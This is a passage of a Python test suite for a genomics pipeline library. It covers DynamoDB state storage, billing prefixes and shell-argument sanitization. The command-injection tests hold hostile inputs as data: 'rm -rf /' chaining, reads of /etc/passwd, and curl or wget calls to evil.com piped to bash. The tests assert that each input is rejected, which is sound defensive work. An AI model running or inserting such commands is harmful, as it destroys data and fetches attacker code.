            assert "execution_context" in call_args[1]["UpdateExpression"]

    def test_get_execution_context_retrieves_correctly(self):
        """Test that get_execution_context retrieves the stored context."""
        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
            mock_resource = MagicMock()
            mock_table = MagicMock()
            mock_session.return_value.resource.return_value = mock_resource
            mock_resource.Table.return_value = mock_table

            from daylib.workset_state_db import WorksetStateDB

            db = WorksetStateDB(table_name="test-table", region="us-west-2")

            # Mock the response from DynamoDB
            mock_table.get_item.return_value = {
                "Item": {
                    "execution_context": {
                        "cluster_name": "stored-cluster",
                        "cluster_region": "eu-central-1",
                        "execution_bucket": "stored-bucket",
                        "workset_prefix": "stored/prefix/",
                    }
                }
            }

            result = db.get_execution_context("ws-001")

            assert result is not None
            assert result["cluster_name"] == "stored-cluster"
            assert result["cluster_region"] == "eu-central-1"
            mock_table.get_item.assert_called_once()

    def test_get_execution_context_returns_none_when_not_set(self):
        """Test that get_execution_context returns None when no context exists."""
        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
            mock_resource = MagicMock()
            mock_table = MagicMock()
            mock_session.return_value.resource.return_value = mock_resource
            mock_resource.Table.return_value = mock_table

            from daylib.workset_state_db import WorksetStateDB

            db = WorksetStateDB(table_name="test-table", region="us-west-2")

            # Mock empty response (workset exists but no execution_context)
            mock_table.get_item.return_value = {
                "Item": {
                    "workset_id": "ws-001",
                    "state": "ready",
                }
            }

            result = db.get_execution_context("ws-001")

            assert result is None

    def test_get_execution_context_returns_none_when_workset_not_found(self):
        """Test that get_execution_context returns None when workset doesn't exist."""
        with patch("daylib.workset_state_db.boto3.Session") as mock_session:
            mock_resource = MagicMock()
            mock_table = MagicMock()
            mock_session.return_value.resource.return_value = mock_resource
            mock_resource.Table.return_value = mock_table

            from daylib.workset_state_db import WorksetStateDB

            db = WorksetStateDB(table_name="test-table", region="us-west-2")

            # Mock empty response (workset not found)
            mock_table.get_item.return_value = {}

            result = db.get_execution_context("nonexistent-ws")

            assert result is None


class TestListWorksetsByCustomerGSI:
    """Tests for list_worksets_by_customer using customer GSI."""

    @pytest.fixture
    def mock_db(self):
        """Create a WorksetStateDB with mocked table."""
        from daylib.workset_state_db import WorksetStateDB

        # Create instance directly and mock the table
        db = WorksetStateDB.__new__(WorksetStateDB)
        db.table_name = "test-table"
        db.table = MagicMock()
        db.dynamodb = MagicMock()
        return db

    def test_list_worksets_by_customer_returns_matching(self, mock_db):
        """Test that list_worksets_by_customer returns worksets for the customer."""
        # Mock query response with customer's worksets
        mock_db.table.query.return_value = {
            "Items": [
                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
                {"workset_id": "ws-002", "customer_id": "cust-123", "state": "complete"},
            ]
        }

        result = mock_db.list_worksets_by_customer("cust-123")

        assert len(result) == 2
        assert result[0]["workset_id"] == "ws-001"
        assert result[1]["workset_id"] == "ws-002"
        # Verify GSI was used
        mock_db.table.query.assert_called_once()
        call_kwargs = mock_db.table.query.call_args[1]
        assert call_kwargs["IndexName"] == "customer-id-state-index"

    def test_list_worksets_by_customer_with_state_filter(self, mock_db):
        """Test filtering by customer and state."""
        from daylib.workset_state_db import WorksetState

        mock_db.table.query.return_value = {
            "Items": [
                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
            ]
        }

        result = mock_db.list_worksets_by_customer("cust-123", state=WorksetState.READY)

        assert len(result) == 1
        # Verify key condition includes state
        call_kwargs = mock_db.table.query.call_args[1]
        assert ":state" in call_kwargs["ExpressionAttributeValues"]
        assert call_kwargs["ExpressionAttributeValues"][":state"] == "ready"

    def test_list_worksets_by_customer_empty_customer_id(self, mock_db):
        """Test that empty customer_id returns empty list."""
        result = mock_db.list_worksets_by_customer("")

        assert result == []
        mock_db.table.query.assert_not_called()

    def test_list_worksets_by_customer_gsi_not_found_fallback(self, mock_db):
        """Test fallback to scan when GSI doesn't exist."""
        from botocore.exceptions import ClientError

        # Simulate GSI not found error
        mock_db.table.query.side_effect = ClientError(
            {"Error": {"Code": "ValidationException", "Message": "customer-id-state-index not found"}},
            "Query"
        )
        # Fallback scan should work
        mock_db.table.scan.return_value = {
            "Items": [
                {"workset_id": "ws-001", "customer_id": "cust-123", "state": "ready"},
            ]
        }

        result = mock_db.list_worksets_by_customer("cust-123")

        assert len(result) == 1
        assert result[0]["workset_id"] == "ws-001"
        mock_db.table.scan.assert_called()

    def test_list_worksets_by_customer_respects_limit(self, mock_db):
        """Test that limit parameter is respected."""
        mock_db.table.query.return_value = {"Items": []}

        mock_db.list_worksets_by_customer("cust-123", limit=50)

        call_kwargs = mock_db.table.query.call_args[1]
        assert call_kwargs["Limit"] == 50


class TestExecutionContextCustomerId:
    """Tests for customer_id in ExecutionContext for DAYLILY_PROJECT billing."""

    def test_execution_context_includes_customer_id(self):
        """Test that ExecutionContext can store customer_id for cost attribution."""
        from daylib.workset_monitor import ExecutionContext

        ctx = ExecutionContext(
            cluster_name="test-cluster",
            cluster_region="us-west-2",
            execution_bucket="test-bucket",
            workset_prefix="worksets/ws-001/",
            customer_id="CX123",
        )

        assert ctx.customer_id == "CX123"

    def test_execution_context_to_dict_includes_customer_id(self):
        """Test that customer_id is serialized in to_dict()."""
        from daylib.workset_monitor import ExecutionContext

        ctx = ExecutionContext(
            cluster_name="test-cluster",
            cluster_region="us-west-2",
            execution_bucket="test-bucket",
            workset_prefix="worksets/ws-001/",
            customer_id="CX456",
        )

        result = ctx.to_dict()
        assert result["customer_id"] == "CX456"

    def test_execution_context_from_dict_includes_customer_id(self):
        """Test that customer_id is deserialized in from_dict()."""
        from daylib.workset_monitor import ExecutionContext

        data = {
            "cluster_name": "test-cluster",
            "cluster_region": "us-west-2",
            "execution_bucket": "test-bucket",
            "workset_prefix": "worksets/ws-001/",
            "customer_id": "CX789",
        }

        ctx = ExecutionContext.from_dict(data)
        assert ctx.customer_id == "CX789"

    def test_execution_context_customer_id_optional(self):
        """Test that customer_id defaults to None when not provided."""
        from daylib.workset_monitor import ExecutionContext

        ctx = ExecutionContext(
            cluster_name="test-cluster",
            cluster_region="us-west-2",
            execution_bucket="test-bucket",
            workset_prefix="worksets/ws-001/",
        )

        assert ctx.customer_id is None

        # Also test from_dict without customer_id
        data = {
            "cluster_name": "test-cluster",
            "cluster_region": "us-west-2",
            "execution_bucket": "test-bucket",
            "workset_prefix": "worksets/ws-001/",
        }
        ctx2 = ExecutionContext.from_dict(data)
        assert ctx2.customer_id is None

    def test_execution_context_roundtrip_with_customer_id(self):
        """Test that customer_id survives to_dict/from_dict roundtrip."""
        from daylib.workset_monitor import ExecutionContext

        original = ExecutionContext(
            cluster_name="roundtrip-cluster",
            cluster_region="eu-central-1",
            execution_bucket="eu-bucket",
            workset_prefix="worksets/eu-ws/",
            customer_id="CX-EU-001",
        )

        reconstructed = ExecutionContext.from_dict(original.to_dict())

        assert reconstructed.customer_id == original.customer_id
        assert reconstructed.customer_id == "CX-EU-001"


class TestDaylilyProjectPrefix:
    """Tests for DAYLILY_PROJECT environment variable prefix on pipeline commands."""

    def test_run_pipeline_prefixes_command_with_daylily_project(self):
        """Test that _run_pipeline adds DAYLILY_PROJECT prefix when customer_id is provided."""
        import shlex

        # Test that the expected command format is correct
        customer_id = "CX123"
        run_prefix = "cd /fsx/analysis && "
        run_suffix = "dy-r run_all"

        # Simulate what _run_pipeline does
        run_command = run_prefix + run_suffix
        if customer_id:
            run_command = f"DAYLILY_PROJECT={shlex.quote(customer_id)} {run_command}"

        assert run_command == "DAYLILY_PROJECT=CX123 cd /fsx/analysis && dy-r run_all"

    def test_run_pipeline_handles_special_characters_in_customer_id(self):
        """Test that customer_id with special characters is properly quoted."""
        import shlex

        customer_id = "CX-123 (Special)"  # Contains space and parens
        run_prefix = ""
        run_suffix = "dy-r run_all"

        run_command = run_prefix + run_suffix
        if customer_id:
            run_command = f"DAYLILY_PROJECT={shlex.quote(customer_id)} {run_command}"

        # shlex.quote should add single quotes around the value
        assert "DAYLILY_PROJECT='CX-123 (Special)'" in run_command

    def test_run_pipeline_no_prefix_without_customer_id(self):
        """Test that no prefix is added when customer_id is None."""
        customer_id = None
        run_prefix = ""
        run_suffix = "dy-r run_all"

        run_command = run_prefix + run_suffix
        if customer_id:
            run_command = f"DAYLILY_PROJECT={customer_id} {run_command}"

        # Should not have DAYLILY_PROJECT prefix
        assert "DAYLILY_PROJECT" not in run_command
        assert run_command == "dy-r run_all"

    def test_run_pipeline_no_prefix_with_empty_customer_id(self):
        """Test that no prefix is added when customer_id is empty string."""
        customer_id = ""
        run_prefix = ""
        run_suffix = "dy-r run_all"

        run_command = run_prefix + run_suffix
        if customer_id:  # Empty string is falsy
            run_command = f"DAYLILY_PROJECT={customer_id} {run_command}"

        # Should not have DAYLILY_PROJECT prefix
        assert "DAYLILY_PROJECT" not in run_command
        assert run_command == "dy-r run_all"


class TestCommandInjectionPrevention:
    """Tests for command injection hardening in shell argument handling.

    These tests validate that the _sanitize_shell_args, _sanitize_clone_args,
    and _sanitize_run_suffix methods properly reject malicious input and
    safely quote legitimate arguments.
    """

    @pytest.fixture
    def monitor(self):
        """Create a WorksetMonitor instance for testing sanitization methods."""
        from daylib.workset_monitor import WorksetMonitor

        monitor = WorksetMonitor.__new__(WorksetMonitor)
        return monitor

    # -------------------------------------------------------------------
    # Tests for _sanitize_shell_args (base sanitization function)
    # -------------------------------------------------------------------

    def test_sanitize_shell_args_empty_string(self, monitor):
        """Test that empty string returns empty string."""
        result = monitor._sanitize_shell_args("", "test")
        assert result == ""

    def test_sanitize_shell_args_none_like_empty(self, monitor):
        """Test that empty/falsy input returns empty string."""
        result = monitor._sanitize_shell_args("", "test")
        assert result == ""

    def test_sanitize_shell_args_simple_args(self, monitor):
        """Test that simple arguments are properly quoted."""
        result = monitor._sanitize_shell_args("wgs -p", "test")
        assert result == "wgs -p"

    def test_sanitize_shell_args_preserves_quoted_spaces(self, monitor):
        """Test that arguments with spaces in quotes are handled correctly."""
        result = monitor._sanitize_shell_args('-d "my workset name"', "test")
        # shlex.split handles the quotes, then shlex.quote re-quotes
        assert "my workset name" in result

    def test_sanitize_shell_args_rejects_semicolon(self, monitor):
        """Test that semicolon (command chaining) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs; rm -rf /", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "';'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_pipe(self, monitor):
        """Test that pipe (command chaining) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs | tee /etc/passwd", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'|'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_ampersand(self, monitor):
        """Test that ampersand (background/chaining) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs & malicious_cmd", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'&'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_dollar_sign(self, monitor):
        """Test that dollar sign (variable expansion) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs $HOME", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'$'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_backtick(self, monitor):
        """Test that backtick (command substitution) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs `whoami`", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'`'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_dollar_paren(self, monitor):
        """Test that $() command substitution is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs $(whoami)", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_dollar_brace(self, monitor):
        """Test that ${} variable expansion is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs ${PATH}", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_newline(self, monitor):
        """Test that newline (command injection) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs\nrm -rf /", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_carriage_return(self, monitor):
        """Test that carriage return is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs\rrm -rf /", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_redirect_out(self, monitor):
        """Test that output redirect is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs > /etc/passwd", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'>'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_redirect_in(self, monitor):
        """Test that input redirect is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs < /etc/passwd", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'<'" in str(exc_info.value)

    def test_sanitize_shell_args_rejects_exclamation(self, monitor):
        """Test that history expansion (!) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("wgs !!", "test args")
        assert "forbidden shell metacharacter" in str(exc_info.value)
        assert "'!'" in str(exc_info.value)

    def test_sanitize_shell_args_invalid_quoting(self, monitor):
        """Test that unbalanced quotes raise an error."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args('wgs "unclosed', "test args")
        assert "Failed to parse" in str(exc_info.value)

    # -------------------------------------------------------------------
    # Tests for _sanitize_clone_args
    # -------------------------------------------------------------------

    def test_sanitize_clone_args_valid_simple(self, monitor):
        """Test valid simple clone args are accepted."""
        result = monitor._sanitize_clone_args("-d my-workset")
        # Each token should be properly quoted
        assert "-d" in result
        assert "my-workset" in result

    def test_sanitize_clone_args_valid_with_options(self, monitor):
        """Test valid clone args with multiple options."""
        result = monitor._sanitize_clone_args("-d my-workset --branch main")
        assert "my-workset" in result
        assert "--branch" in result
        assert "main" in result

    def test_sanitize_clone_args_rejects_injection(self, monitor):
        """Test that injection attempts in clone_args are rejected."""
        from daylib.workset_monitor import MonitorError

        # Attempt to inject a command after clone
        with pytest.raises(MonitorError):
            monitor._sanitize_clone_args("-d workset; rm -rf /")

    def test_sanitize_clone_args_rejects_subshell(self, monitor):
        """Test that subshell attempts in clone_args are rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_clone_args("-d $(cat /etc/passwd)")

    # -------------------------------------------------------------------
    # Tests for _sanitize_run_suffix
    # -------------------------------------------------------------------

    def test_sanitize_run_suffix_valid_dyr_command(self, monitor):
        """Test valid dy-r command is accepted."""
        result = monitor._sanitize_run_suffix("dy-r wgs -p")
        assert "dy-r" in result
        assert "wgs" in result
        assert "-p" in result

    def test_sanitize_run_suffix_valid_short_command(self, monitor):
        """Test valid short command is accepted."""
        result = monitor._sanitize_run_suffix("wgs -p")
        assert "wgs" in result
        assert "-p" in result

    def test_sanitize_run_suffix_valid_with_samples_tsv(self, monitor):
        """Test valid command with --samples-tsv option."""
        result = monitor._sanitize_run_suffix("dy-r wgs --samples-tsv samples.tsv -p")
        assert "samples.tsv" in result
        assert "--samples-tsv" in result

    def test_sanitize_run_suffix_rejects_command_chaining(self, monitor):
        """Test that command chaining in run_suffix is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_run_suffix("wgs -p; curl http://evil.com | bash")

    def test_sanitize_run_suffix_rejects_variable_expansion(self, monitor):
        """Test that variable expansion in run_suffix is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_run_suffix("wgs -p $MALICIOUS")

    def test_sanitize_run_suffix_rejects_backtick_injection(self, monitor):
        """Test that backtick injection in run_suffix is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_run_suffix("wgs `wget http://evil.com/payload`")

    # -------------------------------------------------------------------
    # Tests for _format_clone_args (integration with sanitization)
    # -------------------------------------------------------------------

    def test_format_clone_args_sanitizes_output(self, monitor):
        """Test that _format_clone_args sanitizes the formatted output."""
        from daylib.workset_monitor import Workset

        workset = MagicMock(spec=Workset)
        workset.name = "test-workset"
        work_yaml = {}

        # Valid format string
        result = monitor._format_clone_args("-d {workset}", workset, work_yaml)
        # Should contain the workset name, properly sanitized
        assert "test-workset" in result

    def test_format_clone_args_rejects_malicious_workset_name(self, monitor):
        """Test that malicious patterns in workset name are sanitized."""
        from daylib.workset_monitor import Workset

        workset = MagicMock(spec=Workset)
        # This would be sanitized by _sanitize_name before being formatted
        workset.name = "test-workset"  # Normal name (special chars filtered elsewhere)
        work_yaml = {}

        # The format string substitutes the sanitized workset name
        result = monitor._format_clone_args("-d {workset}", workset, work_yaml)
        # Result should not contain dangerous patterns
        assert ";" not in result
        assert "|" not in result

    def test_format_clone_args_empty_returns_empty(self, monitor):
        """Test that empty clone_args returns empty string."""
        from daylib.workset_monitor import Workset

        workset = MagicMock(spec=Workset)
        workset.name = "test-workset"
        work_yaml = {}

        result = monitor._format_clone_args("", workset, work_yaml)
        assert result == ""

    # -------------------------------------------------------------------
    # Edge cases and comprehensive attack patterns
    # -------------------------------------------------------------------

    def test_sanitize_rejects_null_byte_injection(self, monitor):
        """Test that null byte injection patterns are handled."""
        # Null bytes in the middle of args - shlex should handle this
        # but if it contains a dangerous pattern, we reject first
        from daylib.workset_monitor import MonitorError

        # Combine null with semicolon
        with pytest.raises(MonitorError):
            monitor._sanitize_shell_args("wgs\x00; rm -rf /", "test")

    def test_sanitize_rejects_double_ampersand(self, monitor):
        """Test that && (logical AND) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_shell_args("wgs && rm -rf /", "test")

    def test_sanitize_rejects_double_pipe(self, monitor):
        """Test that || (logical OR) is rejected."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError):
            monitor._sanitize_shell_args("wgs || rm -rf /", "test")

    def test_sanitize_allows_hyphens_and_underscores(self, monitor):
        """Test that common safe characters are allowed."""
        result = monitor._sanitize_shell_args("--my-flag --another_flag value-1", "test")
        assert "--my-flag" in result
        assert "--another_flag" in result
        assert "value-1" in result

    def test_sanitize_allows_dots_in_filenames(self, monitor):
        """Test that dots in filenames are allowed."""
        result = monitor._sanitize_shell_args("--input file.tsv --output result.csv", "test")
        assert "file.tsv" in result
        assert "result.csv" in result

    def test_sanitize_allows_forward_slashes_in_paths(self, monitor):
        """Test that forward slashes in paths are allowed."""
        result = monitor._sanitize_shell_args("--path /fsx/analysis/samples.tsv", "test")
        assert "/fsx/analysis/samples.tsv" in result

    def test_sanitize_properly_quotes_spaces(self, monitor):
        """Test that values with spaces are properly quoted."""
        result = monitor._sanitize_shell_args('-d "workset with spaces"', "test")
        # The result should have the value quoted to preserve the space
        assert "workset with spaces" in result

    def test_sanitize_context_appears_in_error_message(self, monitor):
        """Test that the context string appears in error messages."""
        from daylib.workset_monitor import MonitorError

        with pytest.raises(MonitorError) as exc_info:
            monitor._sanitize_shell_args("bad; command", "my custom context")
        assert "my custom context" in str(exc_info.value)
